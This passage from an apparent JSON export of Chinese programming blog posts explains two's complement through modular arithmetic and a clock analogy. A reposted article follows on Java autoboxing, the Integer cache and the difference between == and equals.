2x(-2)</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n= -3 &#43; 4 = 1</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n所以:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-2) mod 12 = 12-2=10</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-4) mod 12 = 12-4 = 8</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-5) mod 12 = 12 - 5 = 7</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n&nbsp;</p>\r\n<h3 style=\"margin:10px 0px 10px 10px; padding:0px; color:rgb(255,0,85); font-size:16px; font-family:verdana,Arial,Helvetica,sans-serif\">\r\n开始证明</h3>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n再回到时钟的问题上:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n回拨2小时 = 前拨10小时</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n回拨4小时 = 前拨8小时</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n回拨5小时= 前拨7小时</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n注意, 这里发现的规律!</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n结合上面学到的同余的概念.实际上:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-2) mod 12 = 10</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n10 mod 12 = 10</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n-2与10是同余的.</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-4) mod 12 = 8</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n8 mod 12 = 8</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n-4与8是同余的.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n距离成功越来越近了. 要实现用正数替代负数, 只需要运用同余数的两个定理:</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n反身性:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\na ≡ a (mod m)</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n这个定理是很显而易见的.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n线性运算定理:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n如果a ≡ b (mod m)，c ≡ d (mod m) 那么:</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(1)a ± c ≡ b ± d (mod m)</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(2)a * c ≡ b * d (mod m)</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n如果想看这个定理的证明, 请看:<a target=\"_blank\" href=\"http://baike.baidu.com/view/79282.htm\" style=\"margin:0px; padding:0px; text-decoration:none; color:rgb(0,0,0); border-bottom-width:1px; border-bottom-style:dotted; border-bottom-color:rgb(51,51,51)\">http://baike.baidu.com/view/79282.htm</a></p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n所以:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n7 ≡ 7 (mod 12)</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-2) ≡ 10 (mod 12)</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n7 -2 ≡ 7 &#43; 10 (mod 12)</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n现在我们为一个负数, 找到了它的正数同余数. 但是并不是7-2 = 7&#43;10, 而是 7 -2 ≡ 7 &#43; 10 (mod 12) , 即计算结果的余数相等.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n接下来回到二进制的问题上, 看一下: 2-1=1的问题.</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n2-1=2&#43;(-1) = [0000 0010]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;&#43; [1000 0001]<sub style=\"margin:0px; padding:0px\">原</sub>= [0000 0010]<sub style=\"margin:0px; padding:0px\">反</sub>&nbsp;&#43; [1111 1110]<sub style=\"margin:0px; padding:0px\">反</sub></p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n先到这一步, -1的反码表示是1111 1110. 如果这里将[1111 1110]认为是原码, 则[1111 1110]原 = -126, 这里将符号位除去, 即认为是126.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n发现有如下规律:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-1) mod 127 = 126</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n126 mod 127 = 126</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n即:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-1) ≡ 126 (mod 127)</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n2-1 ≡ 2&#43;126 (mod 127)</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n2-1 与 2&#43;126的余数结果是相同的! 而这个余数, 正式我们的期望的计算结果: 2-1=1</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n所以说一个数的反码, 实际上是这个数对于一个膜的同余数. 而这个膜并不是我们的二进制, 而是所能表示的最大&#20540;! 这就和钟表一样, 转了一圈后总能找到在可表示范围内的一个正确的数&#20540;!</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n而2&#43;126很显然相当于钟表转过了一轮, 而因为符号位是参与计算的, 正好和溢出的最高位形成正确的运算结果.</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n既然反码可以将减法变成加法, 那么现在计算机使用的补码呢? 为什么在反码的基础上加1, 还能得到正确的结果?</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n2-1=2&#43;(-1) = [0000 0010]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;&#43; [1000 0001]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= [0000 0010]<sub style=\"margin:0px; padding:0px\">补</sub>&nbsp;&#43; [1111 1111]<sub style=\"margin:0px; padding:0px\">补</sub></p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n如果把[1111 1111]当成原码, 去除符号位, 则:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n[0111 1111]<sub style=\"margin:0px; padding:0px\">原</sub>&nbsp;= 127</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n其实, 在反码的基础上&#43;1, 只是相当于增加了膜的&#20540;:</p>\r\n<blockquote style=\"margin:10px 0px; padding:5px 10px; border:2px solid rgb(239,239,239); color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n(-1) mod 128 = 127</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n127 mod 128 = 127</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px\">\r\n2-1 ≡ 2&#43;127 (mod 128)</p>\r\n</blockquote>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n此时, 表盘相当于每128个刻度转一轮. 所以用补码表示的运算结果最小&#20540;和最大&#20540;应该是[-128, 128].</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n但是由于0的特殊情况, 没有办法表示128, 所以补码的取&#20540;范围是[-128, 127]</p>\r\n<p style=\"margin:10px auto; padding-top:0px; padding-bottom:0px; padding-left:20px; color:rgb(51,51,51); font-family:verdana,Arial,Helvetica,sans-serif; font-size:14px; line-height:25.2px\">\r\n本人一直不善于数学, 所以如果文中有不对的地方请大家多多包含, 多多指点!</p>\r\n",
			"tags":"编码,二进制",
			"id":"49495711",
			"categories":"计算机基础知识",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2015年10月20日 17:31:23",
			"articleedittype":1,
			"private":0,
			"channel":"0",
			"description":"转载：原文地址：http://www.cnblogs.com/shenliang123/archive/2012/04/16/2452156.html\n废话不多说了，开门见山吧，先来看一段代码：\n\n\nString str1 = new String(\"str\");\n        String str2 = new String(\"str\");\n        System.out.pri",
			"title":"java 自动装箱与拆箱 || java中 == 与 equal 的区别",
			"type":"repost",
			"content":"\r\n<div id=\"cnblogs_post_body\" style=\"margin-bottom:20px; word-break:break-word; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:13px; line-height:19.5px\">\r\n<p style=\"line-height:1.5; margin:10px auto\"></p>\r\n<div id=\"cnblogs_post_body\" style=\"margin-bottom:20px; word-break:break-word; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:13px; line-height:19.5px\">\r\n<p style=\"line-height:1.5; margin:10px auto\"><span style=\"color:#ff6666\">转载地址：</span><span style=\"color:#4b4b4b\">http://www.cnblogs.com/shenliang123/archive/2012/04/16/2451996.html</span></p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">这个是jdk1.5以后才引入的新的内容，作为秉承发表是最好的记忆，毅然决定还是用一篇博客来代替我的记忆：</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">java语言规范中说道：在许多情况下包装与解包装是由编译器自行完成的（在这种情况下包装成为装箱，解包装称为拆箱）；</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">其实按照我自己的理解自动装箱就可以简单的理解为将基本数据类型封装为对象类型，来符合java的面向对象；例如用int来举例：</p>\r\n<div class=\"cnblogs_code\" style=\"color:rgb(0,0,0); border:1px solid rgb(204,204,204); padding:5px; overflow:auto; margin:5px 0px; font-family:'Courier New'!important; font-size:12px!important; background-color:rgb(245,245,245)\">\r\n<pre style=\"margin-top:0px; margin-bottom:0px; white-space:pre-wrap; word-wrap:break-word; font-family:'Courier New'!important\"><span style=\"color:rgb(0,128,0); line-height:1.5!important\">//</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">声明一个Integer对象</span>\nInteger num = <span style=\"color:rgb(128,0,128); line-height:1.5!important\">10</span><span style=\"line-height:1.5!important\">;\n</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">//</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">以上的声明就是用到了自动的装箱：解析为</span>\nInteger num = <span style=\"color:rgb(0,0,255); line-height:1.5!important\">new</span> Integer(<span style=\"color:rgb(128,0,128); line-height:1.5!important\">10</span>);</pre>\r\n</div>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">以上就是一个很好的体现，因为10是属于基本数据类型的，原则上它是不能直接赋&#20540;给一个对象Integer的，但jdk1.5后你就可以进行这样的声明，这就是自动装箱的魅力<br>\r\n自动将基本数据类型转化为对应的封装类型。成为一个对象以后就可以调用对象所声明的所有的方法</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">自动拆箱：故名思议就是将对象重新转化为基本数据类型：</p>\r\n<div class=\"cnblogs_code\" style=\"color:rgb(0,0,0); border:1px solid rgb(204,204,204); padding:5px; overflow:auto; margin:5px 0px; font-family:'Courier New'!important; font-size:12px!important; background-color:rgb(245,245,245)\">\r\n<pre style=\"margin-top:0px; margin-bottom:0px; white-space:pre-wrap; word-wrap:break-word; font-family:'Courier New'!important\"><span style=\"color:rgb(0,128,0); line-height:1.5!important\">//</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">装箱</span>\nInteger num = 10<span style=\"line-height:1.5!important\">;\n</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">//</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">拆箱</span>\n<span style=\"color:rgb(0,0,255); line-height:1.5!important\">int</span> num1 = num;</pre>\r\n</div>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">自动拆箱有个很典型的用法就是在进行运算的时候：因为对象时不恩直接进行运算的，而是要转化为基本数据类型后才能进行加减乘除</p>\r\n<div class=\"cnblogs_code\" style=\"color:rgb(0,0,0); border:1px solid rgb(204,204,204); padding:5px; overflow:auto; margin:5px 0px; font-family:'Courier New'!important; font-size:12px!important; background-color:rgb(245,245,245)\">\r\n<pre style=\"margin-top:0px; margin-bottom:0px; white-space:pre-wrap; word-wrap:break-word; font-family:'Courier New'!important\">Integer num = 10<span style=\"line-height:1.5!important\">;\n</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">//</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">进行计算时隐含的有自动拆箱</span>\nSystem.out.print(num--);</pre>\r\n</div>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">哈哈 应该感觉很简单吧，下面我再来讲点稍微难点的，是稍微<br>\r\n看下面一个例子，在看下面一个例子时如果对于 == 与 equal的区别不清楚的，可以先看<a target=\"_blank\" href=\"http://www.cnblogs.com/shenliang123/archive/2012/04/16/2452156.html\" style=\"color:rgb(26,139,200); text-decoration:none\">http://www.cnblogs.com/shenliang123/archive/2012/04/16/2452156.html</a></p>\r\n<div class=\"cnblogs_code\" style=\"color:rgb(0,0,0); border:1px solid rgb(204,204,204); padding:5px; overflow:auto; margin:5px 0px; font-family:'Courier New'!important; font-size:12px!important; background-color:rgb(245,245,245)\">\r\n<pre style=\"margin-top:0px; margin-bottom:0px; white-space:pre-wrap; word-wrap:break-word; font-family:'Courier New'!important\"><span style=\"color:rgb(0,128,0); line-height:1.5!important\">//</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">在-128~127 之外的数</span>\n         Integer num1 = 297;   Integer num2 = 297<span style=\"line-height:1.5!important\">;           \n         System.out.println(</span>&quot;num1==num2: &quot;&#43;(num1==<span style=\"line-height:1.5!important\">num2));                    \n         </span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">//</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\"> 在-128~127 之内的数 </span>\n         Integer num3 = 97;   Integer num4 = 97<span style=\"line-height:1.5!important\">;   \n         System.out.println(</span>&quot;num3==num4: &quot;&#43;(num3==num4)); </pre>\r\n</div>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\"><span style=\"line-height:1.5\">打印的结果是：num1==num2:&nbsp;<span class=\"keyword\" style=\"line-height:1.5\">false</span><span style=\"line-height:1.5\">&nbsp;&nbsp;&nbsp; num3==num4:&nbsp;</span><span class=\"keyword\" style=\"line-height:1.5\">true</span><span style=\"line-height:1.5\">&nbsp;</span></span></p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\"><span style=\"line-height:1.5\"><span style=\"line-height:1.5\">很奇怪吧：这就归结于java对于Integer与int的自动装箱与拆箱的设计，是一种模式：叫<span style=\"line-height:1.5; font-family:宋体; font-size:10.5pt\">享元模式（</span><span lang=\"EN-US\" style=\"line-height:1.5; font-family:'Times New Roman'; font-size:10.5pt\">flyweight</span><span style=\"line-height:1.5; font-family:宋体; font-size:10.5pt\">）</span></span></span></p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\"><span style=\"line-height:1.5\">为了加大对简单数字的重利用，java定义：在自动装箱时对于&#20540;从–128到127之间的&#20540;，它们被装箱为Integer对象后，会存在内存中被重用，始终只存在一个对象</span></p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\"><span style=\"line-height:1.5\">而如果超过了从–128到127之间的&#20540;，被装箱后的Integer对象并不会被重用，即相当于每次装箱时都新建一个 Integer对象；明白了吧</span></p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\"><span style=\"line-height:1.5\">以上的现象是由于使用了自动装箱所引起的，如果你没有使用自动装箱，而是跟一般类一样，用new来进行实例化，就会每次new就都一个新的对象；</span></p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">这个的自动装箱拆箱不仅在基本数据类型中有应用，在String类中也有应用，比如我们经常声明一个String对象时：</p>\r\n<div class=\"cnblogs_code\" style=\"color:rgb(0,0,0); border:1px solid rgb(204,204,204); padding:5px; overflow:auto; margin:5px 0px; font-family:'Courier New'!important; font-size:12px!important; background-color:rgb(245,245,245)\">\r\n<pre style=\"margin-top:0px; margin-bottom:0px; white-space:pre-wrap; word-wrap:break-word; font-family:'Courier New'!important\">String str = &quot;sl&quot;<span style=\"line-height:1.5!important\">;\n</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">//</span><span style=\"color:rgb(0,128,0); line-height:1.5!important\">代替下面的声明方式</span>\nString str = <span style=\"color:rgb(0,0,255); line-height:1.5!important\">new</span> String(&quot;sl&quot;);</pre>\r\n</div>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n</div>\r\n<div id=\"MySignature\" style=\"color:rgb(75,75,75); font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; font-size:13px; line-height:19.5px\">\r\n希望多多交流，多多关注，共同成就梦想</div>\r\n<br>\r\n<p></p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\"><br>\r\n</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">转载：原文地址：http://www.cnblogs.com/shenliang123/archive/2012/04/16/2452156.html</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">废话不多说了，开门见山吧，先来看一段代码：</p>\r\n<div class=\"cnblogs_code\" style=\"color:rgb(0,0,0); border:1px solid rgb(204,204,204); padding:5px; overflow:auto; margin:5px 0px; font-family:'Courier New'!important; font-size:12px!important; background-color:rgb(245,245,245)\">\r\n<div class=\"cnblogs_code_toolbar\" style=\"margin-top:5px\"><span class=\"cnblogs_code_copy\" style=\"padding-right:5px; line-height:1.5!important\"><a target=\"_blank\" target=\"_blank\" title=\"复制代码\" style=\"color:rgb(26,139,200); border:none!important\"><img src=\"http://common.cnblogs.com/images/copycode.gif\" alt=\"复制代码\" style=\"border:none!important\"></a></span></div>\r\n<pre style=\"margin-top:0px; margin-bottom:0px; white-space:pre-wrap; word-wrap:break-word; font-family:'Courier New'!important\">String str1 = <span style=\"color:rgb(0,0,255); line-height:1.5!important\">new</span> String(&quot;str&quot;<span style=\"line-height:1.5!important\">);\n        String str2 </span>= <span style=\"color:rgb(0,0,255); line-height:1.5!important\">new</span> String(&quot;str&quot;<span style=\"line-height:1.5!important\">);\n        System.out.println(</span>&quot;==比较 ：&quot;&#43; (str1 ==<span style=\"line-height:1.5!important\"> str2));\n        System.out.println(</span>&quot;equal比较：&quot;&#43;<span style=\"line-height:1.5!important\"> str1.equals(str2));\n        String str3 </span>= &quot;str1&quot;<span style=\"line-height:1.5!important\">;\n        String str4 </span>= &quot;str1&quot;<span style=\"line-height:1.5!important\">;\n        System.out.println(</span>&quot;==比较 ：&quot;&#43; (str3 ==<span style=\"line-height:1.5!important\"> str4));\n        System.out.println(</span>&quot;equal比较：&quot;&#43; str3.equals(str4));</pre>\r\n<div class=\"cnblogs_code_toolbar\" style=\"margin-top:5px\"><span class=\"cnblogs_code_copy\" style=\"padding-right:5px; line-height:1.5!important\"><a target=\"_blank\" target=\"_blank\" title=\"复制代码\" style=\"color:rgb(26,139,200); border:none!important\"><img src=\"http://common.cnblogs.com/images/copycode.gif\" alt=\"复制代码\" style=\"border:none!important\"></a></span></div>\r\n</div>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">输出的答案：</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\"><img src=\"http://images.cnitblog.com/blog/315693/201302/27115435-7dac4b6ffefe4d88aab60900c81da381.png\" alt=\"\" style=\"border:0px\"></p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">以上的输出结果有误，应该是</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">false</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">equal比较：true</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">true</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">equal比较：true</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">&nbsp;</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">根据打印的可以发现使用equal比较时无论是使用自动装箱来实例化还是用new来实例化，返回的都true，而用==则不一样了，自动装箱来实例化的返回的是true，而用new来</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">实例化的返回的确实false;先不急着解决为什么，先来了解下equals和==的区别，到时候就可以知道答案了</p>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">equals方法最初是在所有类的基类Object中进行定义的，源码是</p>\r\n<div class=\"cnblogs_code\" style=\"color:rgb(0,0,0); border:1px solid rgb(204,204,204); padding:5px; overflow:auto; margin:5px 0px; font-family:'Courier New'!important; font-size:12px!important; background-color:rgb(245,245,245)\">\r\n<pre style=\"margin-top:0px; margin-bottom:0px; white-space:pre-wrap; word-wrap:break-word; font-family:'Courier New'!important\"> <span style=\"color:rgb(0,0,255); line-height:1.5!important\">public</span> <span style=\"color:rgb(0,0,255); line-height:1.5!important\">boolean</span><span style=\"line-height:1.5!important\"> equals(Object obj) {\n    </span><span style=\"color:rgb(0,0,255); line-height:1.5!important\">return</span> (<span style=\"color:rgb(0,0,255); line-height:1.5!important\">this</span> ==<span style=\"line-height:1.5!important\"> obj);\n    }</span></pre>\r\n</div>\r\n<p style=\"color:rgb(75,75,75); line-height:1.5; margin:10px auto\">可以看出这里定义的equals与==是等效的，但上面的怎么还会不一样呢？<br>\r\n原因就是String类对equals进行了重写:</p>\r\n<div class=\"cnblogs_code\" style=\"color:rgb(0,0,0); border:1px solid rgb(204,204,204); padding:5px; overflow:auto; margin:5px 0px; font-family:'Courier New'!important; font-size:12px!important; background-color:rgb(245,245,245)\">\r\n<div class=\"cnblogs_code_toolbar\" style=\"margin-top:5px\"><span class=\"cnblogs_code_copy\" style=\"padding-right:5px; line-height:1.5!important\"><a target=\"_blank\" target=\"_blank\" title=\"复制代码\" style=\"color:rgb(26,139,200); border:none!important\"><img src=\"http://common.cnblogs.com/images/copycode.gif\" alt=\"复制代码\" style=\"border:none!important\"></a></span></div>\r\n<pre style=\"margin-top:0px; margin-bottom:0px; white-space:pre-wrap; word-wrap:break-word; font-family:'Courier New'!important\"><span 